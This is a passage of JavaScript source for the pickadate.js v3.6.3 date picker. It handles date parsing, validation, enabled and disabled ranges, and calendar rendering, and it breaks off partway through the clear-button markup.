/*!
 * Date picker for pickadate.js v3.6.3
 * http://amsul.github.io/pickadate.js/date.htm
 */

(function (factory) {

  // AMD.
  if (typeof define == 'function' && define.amd)
    define(['picker', 'jquery'], factory)

  // Node.js/browserify.
  else if (typeof exports == 'object')
    module.exports = factory(require('./picker.js'), require('jquery'))

  // Browser globals.
  else factory(Picker, jQuery)

}(function (Picker, $) {


  /**
   * Globals and constants
   */
  var DAYS_IN_WEEK = 7,
    WEEKS_IN_CALENDAR = 6,
    _ = Picker._



  /**
   * The date picker constructor
   */
  function DatePicker(picker, settings) {

    var calendar = this,
      element = picker.$node[0],
      elementValue = element.value,
      elementDataValue = picker.$node.data('value'),
      valueString = elementDataValue || elementValue,
      formatString = elementDataValue ? settings.formatSubmit : settings.format,
      isRTL = function () {

        return element.currentStyle ?

          // For IE.
          element.currentStyle.direction == 'rtl' :

          // For normal browsers.
          getComputedStyle(picker.$root[0]).direction == 'rtl'
      }

    calendar.settings = settings
    calendar.$node = picker.$node

    // The queue of methods that will be used to build item objects.
    calendar.queue = {
      min: 'measure create',
      max: 'measure create',
      now: 'now create',
      select: 'parse create validate',
      highlight: 'parse navigate create validate',
      view: 'parse create validate viewset',
      disable: 'deactivate',
      enable: 'activate'
    }

    // The component's item object.
    calendar.item = {}

    calendar.item.clear = null
    calendar.item.disable = (settings.disable || []).slice(0)
    calendar.item.enable = -(function (collectionDisabled) {
      return collectionDisabled[0] === true ? collectionDisabled.shift() : -1
    })(calendar.item.disable)

    calendar.
    set('min', settings.min).
    set('max', settings.max).
    set('now')

    // When there’s a value, set the `select`, which in turn
    // also sets the `highlight` and `view`.
    if (valueString) {
      calendar.set('select', valueString, {
        format: formatString,
        defaultValue: true
      })
    }

    // If there’s no value, default to highlighting “today”.
    else {
      calendar.
      set('select', null).
      set('highlight', calendar.item.now)
    }


    // The keycode to movement mapping.
    calendar.key = {
      40: 7, // Down
      38: -7, // Up
      39: function () {
        return isRTL() ? -1 : 1
      }, // Right
      37: function () {
        return isRTL() ? 1 : -1
      }, // Left
      go: function (timeChange) {
        var highlightedObject = calendar.item.highlight,
          targetDate = new Date(highlightedObject.year, highlightedObject.month, highlightedObject.date + timeChange)
        calendar.set(
          'highlight',
          targetDate, {
            interval: timeChange
          }
        )
        this.render()
      }
    }


    // Bind some picker events.
    picker.
    on('render', function () {
      picker.$root.find('.' + settings.klass.selectMonth).on('change', function () {
        var value = this.value
        if (value) {
          picker.set('highlight', [picker.get('view').year, value, picker.get('highlight').date])
          picker.$root.find('.' + settings.klass.selectMonth).trigger('focus')
        }
      })
      picker.$root.find('.' + settings.klass.selectYear).on('change', function () {
        var value = this.value
        if (value) {
          picker.set('highlight', [value, picker.get('view').month, picker.get('highlight').date])
          picker.$root.find('.' + settings.klass.selectYear).trigger('focus')
        }
      })
    }, 1).
    on('open', function () {
      var includeToday = ''
      if (calendar.disabled(calendar.get('now'))) {
        includeToday = ':not(.' + settings.klass.buttonToday + ')'
      }
      picker.$root.find('button' + includeToday + ', select').attr('disabled', false)
    }, 1).
    on('close', function () {
      picker.$root.find('button, select').attr('disabled', true)
    }, 1)

  } //DatePicker


  /**
   * Set a datepicker item object.
   */
  DatePicker.prototype.set = function (type, value, options) {

    var calendar = this,
      calendarItem = calendar.item

    // If the value is `null` just set it immediately.
    if (value === null) {
      if (type == 'clear') type = 'select'
      calendarItem[type] = value
      return calendar
    }

    // Otherwise go through the queue of methods, and invoke the functions.
    // Update this as the time unit, and set the final value as this item.
    // * In the case of `enable`, keep the queue but set `disable` instead.
    //   And in the case of `flip`, keep the queue but set `enable` instead.
    calendarItem[(type == 'enable' ? 'disable' : type == 'flip' ? 'enable' : type)] = calendar.queue[type].split(' ').map(function (method) {
      value = calendar[method](type, value, options)
      return value
    }).pop()

    // Check if we need to cascade through more updates.
    if (type == 'select') {
      calendar.set('highlight', calendarItem.select, options)
    } else if (type == 'highlight') {
      calendar.set('view', calendarItem.highlight, options)
    } else if (type.match(/^(flip|min|max|disable|enable)$/)) {
      if (calendarItem.select && calendar.disabled(calendarItem.select)) {
        calendar.set('select', calendarItem.select, options)
      }
      if (calendarItem.highlight && calendar.disabled(calendarItem.highlight)) {
        calendar.set('highlight', calendarItem.highlight, options)
      }
    }

    return calendar
  } //DatePicker.prototype.set


  /**
   * Get a datepicker item object.
   */
  DatePicker.prototype.get = function (type) {
    return this.item[type]
  } //DatePicker.prototype.get


  /**
   * Create a picker date object.
   */
  DatePicker.prototype.create = function (type, value, options) {

    var isInfiniteValue,
      calendar = this

    // If there’s no value, use the type as the value.
    value = value === undefined ? type : value


    // If it’s infinity, update the value.
    if (value == -Infinity || value == Infinity) {
      isInfiniteValue = value
    }

    // If it’s an object, use the native date object.
    else if ($.isPlainObject(value) && _.isInteger(value.pick)) {
      value = value.obj
    }

    // If it’s an array, convert it into a date and make sure
    // that it’s a valid date – otherwise default to today.
    else if ($.isArray(value)) {
      value = new Date(value[0], value[1], value[2])
      value = _.isDate(value) ? value : calendar.create().obj
    }

    // If it’s a number or date object, make a normalized date.
    else if (_.isInteger(value) || _.isDate(value)) {
      value = calendar.normalize(new Date(value), options)
    }

    // If it’s a literal true or any other case, set it to now.
    else /*if ( value === true )*/ {
      value = calendar.now(type, value, options)
    }

    // Return the compiled object.
    return {
      year: isInfiniteValue || value.getFullYear(),
      month: isInfiniteValue || value.getMonth(),
      date: isInfiniteValue || value.getDate(),
      day: isInfiniteValue || value.getDay(),
      obj: isInfiniteValue || value,
      pick: isInfiniteValue || value.getTime()
    }
  } //DatePicker.prototype.create


  /**
   * Create a range limit object using an array, date object,
   * literal “true”, or integer relative to another time.
   */
  DatePicker.prototype.createRange = function (from, to) {

    var calendar = this,
      createDate = function (date) {
        if (date === true || $.isArray(date) || _.isDate(date)) {
          return calendar.create(date)
        }
        return date
      }

    // Create objects if possible.
    if (!_.isInteger(from)) {
      from = createDate(from)
    }
    if (!_.isInteger(to)) {
      to = createDate(to)
    }

    // Create relative dates.
    if (_.isInteger(from) && $.isPlainObject(to)) {
      from = [to.year, to.month, to.date + from];
    } else if (_.isInteger(to) && $.isPlainObject(from)) {
      to = [from.year, from.month, from.date + to];
    }

    return {
      from: createDate(from),
      to: createDate(to)
    }
  } //DatePicker.prototype.createRange


  /**
   * Check if a date unit falls within a date range object.
   */
  DatePicker.prototype.withinRange = function (range, dateUnit) {
    range = this.createRange(range.from, range.to)
    return dateUnit.pick >= range.from.pick && dateUnit.pick <= range.to.pick
  }


  /**
   * Check if two date range objects overlap.
   */
  DatePicker.prototype.overlapRanges = function (one, two) {

    var calendar = this

    // Convert the ranges into comparable dates.
    one = calendar.createRange(one.from, one.to)
    two = calendar.createRange(two.from, two.to)

    return calendar.withinRange(one, two.from) || calendar.withinRange(one, two.to) ||
      calendar.withinRange(two, one.from) || calendar.withinRange(two, one.to)
  }


  /**
   * Get the date today.
   */
  DatePicker.prototype.now = function (type, value, options) {
    value = new Date()
    if (options && options.rel) {
      value.setDate(value.getDate() + options.rel)
    }
    return this.normalize(value, options)
  }


  /**
   * Navigate to next/prev month.
   */
  DatePicker.prototype.navigate = function (type, value, options) {

    var targetDateObject,
      targetYear,
      targetMonth,
      targetDate,
      isTargetArray = $.isArray(value),
      isTargetObject = $.isPlainObject(value),
      viewsetObject = this.item.view
    /*,
          safety = 100*/


    if (isTargetArray || isTargetObject) {

      if (isTargetObject) {
        targetYear = value.year
        targetMonth = value.month
        targetDate = value.date
      } else {
        targetYear = +value[0]
        targetMonth = +value[1]
        targetDate = +value[2]
      }

      // If we’re navigating months but the view is in a different
      // month, navigate to the view’s year and month.
      if (options && options.nav && viewsetObject && viewsetObject.month !== targetMonth) {
        targetYear = viewsetObject.year
        targetMonth = viewsetObject.month
      }

      // Figure out the expected target year and month.
      targetDateObject = new Date(targetYear, targetMonth + (options && options.nav ? options.nav : 0), 1)
      targetYear = targetDateObject.getFullYear()
      targetMonth = targetDateObject.getMonth()

      // If the month we’re going to doesn’t have enough days,
      // keep decreasing the date until we reach the month’s last date.
      while ( /*safety &&*/ new Date(targetYear, targetMonth, targetDate).getMonth() !== targetMonth) {
        targetDate -= 1
        /*safety -= 1
        if ( !safety ) {
            throw 'Fell into an infinite loop while navigating to ' + new Date( targetYear, targetMonth, targetDate ) + '.'
        }*/
      }

      value = [targetYear, targetMonth, targetDate]
    }

    return value
  } //DatePicker.prototype.navigate


  /**
   * Normalize a date by setting the hours to midnight.
   */
  DatePicker.prototype.normalize = function (value /*, options*/ ) {
    value.setHours(0, 0, 0, 0)
    return value
  }


  /**
   * Measure the range of dates.
   */
  DatePicker.prototype.measure = function (type, value /*, options*/ ) {

    var calendar = this

    // If it's an integer, get a date relative to today.
    if (_.isInteger(value)) {
      value = calendar.now(type, value, {
        rel: value
      })
    }

    // If it’s anything false-y, remove the limits.
    else if (!value) {
      value = type == 'min' ? -Infinity : Infinity
    }

    // If it’s a string, parse it.
    else if (typeof value == 'string') {
      value = calendar.parse(type, value)
    }

    return value
  } ///DatePicker.prototype.measure


  /**
   * Create a viewset object based on navigation.
   */
  DatePicker.prototype.viewset = function (type, dateObject /*, options*/ ) {
    return this.create([dateObject.year, dateObject.month, 1])
  }


  /**
   * Validate a date as enabled and shift if needed.
   */
  DatePicker.prototype.validate = function (type, dateObject, options) {

    var calendar = this,

      // Keep a reference to the original date.
      originalDateObject = dateObject,

      // Make sure we have an interval.
      interval = options && options.interval ? options.interval : 1,

      // Check if the calendar enabled dates are inverted.
      isFlippedBase = calendar.item.enable === -1,

      // Check if we have any enabled dates after/before now.
      hasEnabledBeforeTarget, hasEnabledAfterTarget,

      // The min & max limits.
      minLimitObject = calendar.item.min,
      maxLimitObject = calendar.item.max,

      // Check if we’ve reached the limit during shifting.
      reachedMin, reachedMax,

      // Check if the calendar is inverted and at least one weekday is enabled.
      hasEnabledWeekdays = isFlippedBase && calendar.item.disable.filter(function (value) {

        // If there’s a date, check where it is relative to the target.
        if ($.isArray(value)) {
          var dateTime = calendar.create(value).pick
          if (dateTime < dateObject.pick) hasEnabledBeforeTarget = true
          else if (dateTime > dateObject.pick) hasEnabledAfterTarget = true
        }

        // Return only integers for enabled weekdays.
        return _.isInteger(value)
      }).length
    /*,

          safety = 100*/



    // Cases to validate for:
    // [1] Not inverted and date disabled.
    // [2] Inverted and some dates enabled.
    // [3] Not inverted and out of range.
    //
    // Cases to **not** validate for:
    // • Navigating months.
    // • Not inverted and date enabled.
    // • Inverted and all dates disabled.
    // • ..and anything else.
    if (!options || (!options.nav && !options.defaultValue))
      if (
        /* 1 */
        (!isFlippedBase && calendar.disabled(dateObject)) ||
        /* 2 */
        (isFlippedBase && calendar.disabled(dateObject) && (hasEnabledWeekdays || hasEnabledBeforeTarget || hasEnabledAfterTarget)) ||
        /* 3 */
        (!isFlippedBase && (dateObject.pick <= minLimitObject.pick || dateObject.pick >= maxLimitObject.pick))
      ) {


        // When inverted, flip the direction if there aren’t any enabled weekdays
        // and there are no enabled dates in the direction of the interval.
        if (isFlippedBase && !hasEnabledWeekdays && ((!hasEnabledAfterTarget && interval > 0) || (!hasEnabledBeforeTarget && interval < 0))) {
          interval *= -1
        }


        // Keep looping until we reach an enabled date.
        while ( /*safety &&*/ calendar.disabled(dateObject)) {

          /*safety -= 1
          if ( !safety ) {
              throw 'Fell into an infinite loop while validating ' + dateObject.obj + '.'
          }*/


          // If we’ve looped into the next/prev month with a large interval, return to the original date and flatten the interval.
          if (Math.abs(interval) > 1 && (dateObject.month < originalDateObject.month || dateObject.month > originalDateObject.month)) {
            dateObject = originalDateObject
            interval = interval > 0 ? 1 : -1
          }


          // If we’ve reached the min/max limit, reverse the direction, flatten the interval and set it to the limit.
          if (dateObject.pick <= minLimitObject.pick) {
            reachedMin = true
            interval = 1
            dateObject = calendar.create([
              minLimitObject.year,
              minLimitObject.month,
              minLimitObject.date + (dateObject.pick === minLimitObject.pick ? 0 : -1)
            ])
          } else if (dateObject.pick >= maxLimitObject.pick) {
            reachedMax = true
            interval = -1
            dateObject = calendar.create([
              maxLimitObject.year,
              maxLimitObject.month,
              maxLimitObject.date + (dateObject.pick === maxLimitObject.pick ? 0 : 1)
            ])
          }


          // If we’ve reached both limits, just break out of the loop.
          if (reachedMin && reachedMax) {
            break
          }


          // Finally, create the shifted date using the interval and keep looping.
          dateObject = calendar.create([dateObject.year, dateObject.month, dateObject.date + interval])
        }

      } //endif


    // Return the date object settled on.
    return dateObject
  } //DatePicker.prototype.validate


  /**
   * Check if a date is disabled.
   */
  DatePicker.prototype.disabled = function (dateToVerify) {

    var
      calendar = this,

      // Filter through the disabled dates to check if this is one.
      isDisabledMatch = calendar.item.disable.filter(function (dateToDisable) {

        // If the date is a number, match the weekday with 0index and `firstDay` check.
        if (_.isInteger(dateToDisable)) {
          return dateToVerify.day === (calendar.settings.firstDay ? dateToDisable : dateToDisable - 1) % 7
        }

        // If it’s an array or a native JS date, create and match the exact date.
        if ($.isArray(dateToDisable) || _.isDate(dateToDisable)) {
          return dateToVerify.pick === calendar.create(dateToDisable).pick
        }

        // If it’s an object, match a date within the “from” and “to” range.
        if ($.isPlainObject(dateToDisable)) {
          return calendar.withinRange(dateToDisable, dateToVerify)
        }
      })

    // If this date matches a disabled date, confirm it’s not inverted.
    isDisabledMatch = isDisabledMatch.length && !isDisabledMatch.filter(function (dateToDisable) {
      return $.isArray(dateToDisable) && dateToDisable[3] == 'inverted' ||
        $.isPlainObject(dateToDisable) && dateToDisable.inverted
    }).length

    // Check the calendar “enabled” flag and respectively flip the
    // disabled state. Then also check if it’s beyond the min/max limits.
    return calendar.item.enable === -1 ? !isDisabledMatch : isDisabledMatch ||
      dateToVerify.pick < calendar.item.min.pick ||
      dateToVerify.pick > calendar.item.max.pick

  } //DatePicker.prototype.disabled


  /**
   * Parse a string into a usable type.
   */
  DatePicker.prototype.parse = function (type, value, options) {

    var calendar = this,
      parsingObject = {}

    // If it’s already parsed, we’re good.
    if (!value || typeof value != 'string') {
      return value
    }

    // We need a `.format` to parse the value with.
    if (!(options && options.format)) {
      options = options || {}
      options.format = calendar.settings.format
    }

    // Convert the format into an array and then map through it.
    calendar.formats.toArray(options.format).map(function (label) {

      var
        // Grab the formatting label.
        formattingLabel = calendar.formats[label],

        // The format length is from the formatting label function or the
        // label length without the escaping exclamation (!) mark.
        formatLength = formattingLabel ? _.trigger(formattingLabel, calendar, [value, parsingObject]) : label.replace(/^!/, '').length

      // If there's a format label, split the value up to the format length.
      // Then add it to the parsing object with appropriate label.
      if (formattingLabel) {
        parsingObject[label] = value.substr(0, formatLength)
      }

      // Update the value as the substring from format length to end.
      value = value.substr(formatLength)
    })

    // Compensate for month 0index.
    return [
      parsingObject.yyyy || parsingObject.yy,
      +(parsingObject.mm || parsingObject.m) - 1,
      parsingObject.dd || parsingObject.d
    ]
  } //DatePicker.prototype.parse


  /**
   * Various formats to display the object in.
   */
  DatePicker.prototype.formats = (function () {

    // Return the length of the first word in a collection.
    function getWordLengthFromCollection(string, collection, dateObject) {

      // Grab the first word from the string.
      // Regex pattern from http://stackoverflow.com/q/150033
      var word = string.match(/[^\x00-\x7F]+|\w+/)[0]

      // If there's no month index, add it to the date object
      if (!dateObject.mm && !dateObject.m) {
        dateObject.m = collection.indexOf(word) + 1
      }

      // Return the length of the word.
      return word.length
    }

    // Get the length of the first word in a string.
    function getFirstWordLength(string) {
      return string.match(/\w+/)[0].length
    }

    return {

      d: function (string, dateObject) {

        // If there's string, then get the digits length.
        // Otherwise return the selected date.
        return string ? _.digits(string) : dateObject.date
      },
      dd: function (string, dateObject) {

        // If there's a string, then the length is always 2.
        // Otherwise return the selected date with a leading zero.
        return string ? 2 : _.lead(dateObject.date)
      },
      ddd: function (string, dateObject) {

        // If there's a string, then get the length of the first word.
        // Otherwise return the short selected weekday.
        return string ? getFirstWordLength(string) : this.settings.weekdaysShort[dateObject.day]
      },
      dddd: function (string, dateObject) {

        // If there's a string, then get the length of the first word.
        // Otherwise return the full selected weekday.
        return string ? getFirstWordLength(string) : this.settings.weekdaysFull[dateObject.day]
      },
      m: function (string, dateObject) {

        // If there's a string, then get the length of the digits
        // Otherwise return the selected month with 0index compensation.
        return string ? _.digits(string) : dateObject.month + 1
      },
      mm: function (string, dateObject) {

        // If there's a string, then the length is always 2.
        // Otherwise return the selected month with 0index and leading zero.
        return string ? 2 : _.lead(dateObject.month + 1)
      },
      mmm: function (string, dateObject) {

        var collection = this.settings.monthsShort

        // If there's a string, get length of the relevant month from the short
        // months collection. Otherwise return the selected month from that collection.
        return string ? getWordLengthFromCollection(string, collection, dateObject) : collection[dateObject.month]
      },
      mmmm: function (string, dateObject) {

        var collection = this.settings.monthsFull

        // If there's a string, get length of the relevant month from the full
        // months collection. Otherwise return the selected month from that collection.
        return string ? getWordLengthFromCollection(string, collection, dateObject) : collection[dateObject.month]
      },
      yy: function (string, dateObject) {

        // If there's a string, then the length is always 2.
        // Otherwise return the selected year by slicing out the first 2 digits.
        return string ? 2 : ('' + dateObject.year).slice(2)
      },
      yyyy: function (string, dateObject) {

        // If there's a string, then the length is always 4.
        // Otherwise return the selected year.
        return string ? 4 : dateObject.year
      },

      // Create an array by splitting the formatting string passed.
      toArray: function (formatString) {
        return formatString.split(/(d{1,4}|m{1,4}|y{4}|yy|!.)/g)
      },

      // Format an object into a string using the formatting options.
      toString: function (formatString, itemObject) {
        var calendar = this
        return calendar.formats.toArray(formatString).map(function (label) {
          return _.trigger(calendar.formats[label], calendar, [0, itemObject]) || label.replace(/^!/, '')
        }).join('')
      }
    }
  })() //DatePicker.prototype.formats




  /**
   * Check if two date units are the exact.
   */
  DatePicker.prototype.isDateExact = function (one, two) {

    var calendar = this

    // When we’re working with weekdays, do a direct comparison.
    if (
      (_.isInteger(one) && _.isInteger(two)) ||
      (typeof one == 'boolean' && typeof two == 'boolean')
    ) {
      return one === two
    }

    // When we’re working with date representations, compare the “pick” value.
    if (
      (_.isDate(one) || $.isArray(one)) &&
      (_.isDate(two) || $.isArray(two))
    ) {
      return calendar.create(one).pick === calendar.create(two).pick
    }

    // When we’re working with range objects, compare the “from” and “to”.
    if ($.isPlainObject(one) && $.isPlainObject(two)) {
      return calendar.isDateExact(one.from, two.from) && calendar.isDateExact(one.to, two.to)
    }

    return false
  }


  /**
   * Check if two date units overlap.
   */
  DatePicker.prototype.isDateOverlap = function (one, two) {

    var calendar = this,
      firstDay = calendar.settings.firstDay ? 1 : 0

    // When we’re working with a weekday index, compare the days.
    if (_.isInteger(one) && (_.isDate(two) || $.isArray(two))) {
      one = one % 7 + firstDay
      return one === calendar.create(two).day + 1
    }
    if (_.isInteger(two) && (_.isDate(one) || $.isArray(one))) {
      two = two % 7 + firstDay
      return two === calendar.create(one).day + 1
    }

    // When we’re working with range objects, check if the ranges overlap.
    if ($.isPlainObject(one) && $.isPlainObject(two)) {
      return calendar.overlapRanges(one, two)
    }

    return false
  }


  /**
   * Flip the “enabled” state.
   */
  DatePicker.prototype.flipEnable = function (val) {
    var itemObject = this.item
    itemObject.enable = val || (itemObject.enable == -1 ? 1 : -1)
  }


  /**
   * Mark a collection of dates as “disabled”.
   */
  DatePicker.prototype.deactivate = function (type, datesToDisable) {

    var calendar = this,
      disabledItems = calendar.item.disable.slice(0)


    // If we’re flipping, that’s all we need to do.
    if (datesToDisable == 'flip') {
      calendar.flipEnable()
    } else if (datesToDisable === false) {
      calendar.flipEnable(1)
      disabledItems = []
    } else if (datesToDisable === true) {
      calendar.flipEnable(-1)
      disabledItems = []
    }

    // Otherwise go through the dates to disable.
    else {

      datesToDisable.map(function (unitToDisable) {

        var matchFound

        // When we have disabled items, check for matches.
        // If something is matched, immediately break out.
        for (var index = 0; index < disabledItems.length; index += 1) {
          if (calendar.isDateExact(unitToDisable, disabledItems[index])) {
            matchFound = true
            break
          }
        }

        // If nothing was found, add the validated unit to the collection.
        if (!matchFound) {
          if (
            _.isInteger(unitToDisable) ||
            _.isDate(unitToDisable) ||
            $.isArray(unitToDisable) ||
            ($.isPlainObject(unitToDisable) && unitToDisable.from && unitToDisable.to)
          ) {
            disabledItems.push(unitToDisable)
          }
        }
      })
    }

    // Return the updated collection.
    return disabledItems
  } //DatePicker.prototype.deactivate


  /**
   * Mark a collection of dates as “enabled”.
   */
  DatePicker.prototype.activate = function (type, datesToEnable) {

    var calendar = this,
      disabledItems = calendar.item.disable,
      disabledItemsCount = disabledItems.length

    // If we’re flipping, that’s all we need to do.
    if (datesToEnable == 'flip') {
      calendar.flipEnable()
    } else if (datesToEnable === true) {
      calendar.flipEnable(1)
      disabledItems = []
    } else if (datesToEnable === false) {
      calendar.flipEnable(-1)
      disabledItems = []
    }

    // Otherwise go through the disabled dates.
    else {

      datesToEnable.map(function (unitToEnable) {

        var matchFound,
          disabledUnit,
          index,
          isExactRange

        // Go through the disabled items and try to find a match.
        for (index = 0; index < disabledItemsCount; index += 1) {

          disabledUnit = disabledItems[index]

          // When an exact match is found, remove it from the collection.
          if (calendar.isDateExact(disabledUnit, unitToEnable)) {
            matchFound = disabledItems[index] = null
            isExactRange = true
            break
          }

          // When an overlapped match is found, add the “inverted” state to it.
          else if (calendar.isDateOverlap(disabledUnit, unitToEnable)) {
            if ($.isPlainObject(unitToEnable)) {
              unitToEnable.inverted = true
              matchFound = unitToEnable
            } else if ($.isArray(unitToEnable)) {
              matchFound = unitToEnable
              if (!matchFound[3]) matchFound.push('inverted')
            } else if (_.isDate(unitToEnable)) {
              matchFound = [unitToEnable.getFullYear(), unitToEnable.getMonth(), unitToEnable.getDate(), 'inverted']
            }
            break
          }
        }

        // If a match was found, remove a previous duplicate entry.
        if (matchFound)
          for (index = 0; index < disabledItemsCount; index += 1) {
            if (calendar.isDateExact(disabledItems[index], unitToEnable)) {
              disabledItems[index] = null
              break
            }
          }

        // In the event that we’re dealing with an exact range of dates,
        // make sure there are no “inverted” dates because of it.
        if (isExactRange)
          for (index = 0; index < disabledItemsCount; index += 1) {
            if (calendar.isDateOverlap(disabledItems[index], unitToEnable)) {
              disabledItems[index] = null
              break
            }
          }

        // If something is still matched, add it into the collection.
        if (matchFound) {
          disabledItems.push(matchFound)
        }
      })
    }

    // Return the updated collection.
    return disabledItems.filter(function (val) {
      return val != null
    })
  } //DatePicker.prototype.activate


  /**
   * Create a string for the nodes in the picker.
   */
  DatePicker.prototype.nodes = function (isOpen) {

    var
      calendar = this,
      settings = calendar.settings,
      calendarItem = calendar.item,
      nowObject = calendarItem.now,
      selectedObject = calendarItem.select,
      highlightedObject = calendarItem.highlight,
      viewsetObject = calendarItem.view,
      disabledCollection = calendarItem.disable,
      minLimitObject = calendarItem.min,
      maxLimitObject = calendarItem.max,


      // Create the calendar table head using a copy of weekday labels collection.
      // * We do a copy so we don't mutate the original array.
      tableHead = (function (collection, fullCollection) {

        // If the first day should be Monday, move Sunday to the end.
        if (settings.firstDay) {
          collection.push(collection.shift())
          fullCollection.push(fullCollection.shift())
        }

        // Create and return the table head group.
        return _.node(
          'thead',
          _.node(
            'tr',
            _.group({
              min: 0,
              max: DAYS_IN_WEEK - 1,
              i: 1,
              node: 'th',
              item: function (counter) {
                return [
                  collection[counter],
                  settings.klass.weekdays,
                  'scope=col title="' + fullCollection[counter] + '"'
                ]
              }
            })
          )
        ) //endreturn
      })((settings.showWeekdaysFull ? settings.weekdaysFull : settings.weekdaysShort).slice(0), settings.weekdaysFull.slice(0)), //tableHead


      // Create the nav for next/prev month.
      createMonthNav = function (next) {

        // Otherwise, return the created month tag.
        return _.node(
          'button',
          ' ',
          settings.klass['nav' + (next ? 'Next' : 'Prev')] + (

            // If the focused month is outside the range, disabled the button.
            (next && viewsetObject.year >= maxLimitObject.year && viewsetObject.month >= maxLimitObject.month) ||
            (!next && viewsetObject.year <= minLimitObject.year && viewsetObject.month <= minLimitObject.month) ?
            ' ' + settings.klass.navDisabled : ''
          ),
          'data-nav=' + (next || -1) + ' ' +
          _.ariaAttr({
            role: 'button',

            controls: calendar.$node[0].id + '_table'
          }) + ' ' +
          'title="' + (next ? settings.labelMonthNext : settings.labelMonthPrev) + '"'
        ) //endreturn
      }, //createMonthNav


      // Create the month label.
      createMonthLabel = function () {

        var monthsCollection = settings.showMonthsShort ? settings.monthsShort : settings.monthsFull

        // If there are months to select, add a dropdown menu.
        if (settings.selectMonths) {

          return _.node('select',
            _.group({
              min: 0,
              max: 11,
              i: 1,
              node: 'option',
              item: function (loopedMonth) {

                return [

                  // The looped month and no classes.
                  monthsCollection[loopedMonth], 0,

                  // Set the value and selected index.
                  'value=' + loopedMonth +
                  (viewsetObject.month == loopedMonth ? ' selected' : '') +
                  (
                    (
                      (viewsetObject.year == minLimitObject.year && loopedMonth < minLimitObject.month) ||
                      (viewsetObject.year == maxLimitObject.year && loopedMonth > maxLimitObject.month)
                    ) ?
                    ' disabled' : ''
                  )
                ]
              }
            }),
            settings.klass.selectMonth,
            (isOpen ? '' : 'disabled') + ' ' +
            _.ariaAttr({
              controls: calendar.$node[0].id + '_table'
            }) + ' ' +
            'title="' + settings.labelMonthSelect + '"'
          )
        }

        // If there's a need for a month selector
        return _.node('div', monthsCollection[viewsetObject.month], settings.klass.month)
      }, //createMonthLabel


      // Create the year label.
      createYearLabel = function () {

        var focusedYear = viewsetObject.year,

          // If years selector is set to a literal "true", set it to 5. Otherwise
          // divide in half to get half before and half after focused year.
          numberYears = settings.selectYears === true ? 5 : ~~(settings.selectYears / 2)

        // If there are years to select, add a dropdown menu.
        if (numberYears) {

          var
            minYear = minLimitObject.year,
            maxYear = maxLimitObject.year,
            lowestYear = focusedYear - numberYears,
            highestYear = focusedYear + numberYears

          // If the min year is greater than the lowest year, increase the highest year
          // by the difference and set the lowest year to the min year.
          if (minYear > lowestYear) {
            highestYear += minYear - lowestYear
            lowestYear = minYear
          }

          // If the max year is less than the highest year, decrease the lowest year
          // by the lower of the two: available and needed years. Then set the
          // highest year to the max year.
          if (maxYear < highestYear) {

            var availableYears = lowestYear - minYear,
              neededYears = highestYear - maxYear

            lowestYear -= availableYears > neededYears ? neededYears : availableYears
            highestYear = maxYear
          }

          return _.node('select',
            _.group({
              min: lowestYear,
              max: highestYear,
              i: 1,
              node: 'option',
              item: function (loopedYear) {
                return [

                  // The looped year and no classes.
                  loopedYear, 0,

                  // Set the value and selected index.
                  'value=' + loopedYear + (focusedYear == loopedYear ? ' selected' : '')
                ]
              }
            }),
            settings.klass.selectYear,
            (isOpen ? '' : 'disabled') + ' ' + _.ariaAttr({
              controls: calendar.$node[0].id + '_table'
            }) + ' ' +
            'title="' + settings.labelYearSelect + '"'
          )
        }

        // Otherwise just return the year focused
        return _.node('div', focusedYear, settings.klass.year)
      } //createYearLabel


    // Create and return the entire calendar.
    return _.node(
        'div',
        (settings.selectYears ? createYearLabel() + createMonthLabel() : createMonthLabel() + createYearLabel()) +
        createMonthNav() + createMonthNav(1),
        settings.klass.header
      ) + _.node(
        'table',
        tableHead +
        _.node(
          'tbody',
          _.group({
            min: 0,
            max: WEEKS_IN_CALENDAR - 1,
            i: 1,
            node: 'tr',
            item: function (rowCounter) {

              // If Monday is the first day and the month starts on Sunday, shift the date back a week.
              var shiftDateBy = settings.firstDay && calendar.create([viewsetObject.year, viewsetObject.month, 1]).day === 0 ? -7 : 0

              return [
                _.group({
                  min: DAYS_IN_WEEK * rowCounter - viewsetObject.day + shiftDateBy + 1, // Add 1 for weekday 0index
                  max: function () {
                    return this.min + DAYS_IN_WEEK - 1
                  },
                  i: 1,
                  node: 'td',
                  item: function (targetDate) {

                    // Convert the time date from a relative date to a target date.
                    targetDate = calendar.create([viewsetObject.year, viewsetObject.month, targetDate + (settings.firstDay ? 1 : 0)])

                    var isSelected = selectedObject && selectedObject.pick == targetDate.pick,
                      isHighlighted = highlightedObject && highlightedObject.pick == targetDate.pick,
                      isDisabled = disabledCollection && calendar.disabled(targetDate) || targetDate.pick < minLimitObject.pick || targetDate.pick > maxLimitObject.pick,
                      formattedDate = _.trigger(calendar.formats.toString, calendar, [settings.format, targetDate])

                    return [
                      _.node(
                        'div',
                        targetDate.date,
                        (function (klasses) {

                          // Add the `infocus` or `outfocus` classes based on month in view.
                          klasses.push(viewsetObject.month == targetDate.month ? settings.klass.infocus : settings.klass.outfocus)

                          // Add the `today` class if needed.
                          if (nowObject.pick == targetDate.pick) {
                            klasses.push(settings.klass.now)
                          }

                          // Add the `selected` class if something's selected and the time matches.
                          if (isSelected) {
                            klasses.push(settings.klass.selected)
                          }

                          // Add the `highlighted` class if something's highlighted and the time matches.
                          if (isHighlighted) {
                            klasses.push(settings.klass.highlighted)
                          }

                          // Add the `disabled` class if something's disabled and the object matches.
                          if (isDisabled) {
                            klasses.push(settings.klass.disabled)
                          }

                          return klasses.join(' ')
                        })([settings.klass.day]),
                        'data-pick=' + targetDate.pick + ' ' + _.ariaAttr({
                          role: 'gridcell',
                          label: formattedDate,
                          selected: isSelected && calendar.$node.val() === formattedDate ? true : null,
                          activedescendant: isHighlighted ? true : null,
                          disabled: isDisabled ? true : null
                        })
                      ),
                      '',
                      _.ariaAttr({
                        role: 'presentation'
                      })
                    ] //endreturn
                  }
                })
              ] //endreturn
            }
          })
        ),
        settings.klass.table,
        'id="' + calendar.$node[0].id + '_table' + '" ' + _.ariaAttr({
          role: 'grid',
          controls: calendar.$node[0].id,
          readonly: true
        })
      ) +

      // * For Firefox forms to submit, make sure to set the buttons’ `type` attributes as “button”.
      _.node(
        'div',
        _.node('button', settings.today, settings.klass.buttonToday,
          'type=button data-pick=' + nowObject.pick +
          (isOpen && !calendar.disabled(nowObject) ? '' : ' disabled') + ' ' +
          _.ariaAttr({
            controls: calendar.$node[0].id
          })) +
        _.node('button', settings.clear, settings.klass.buttonClear,
          'type=button data-clear=1' +
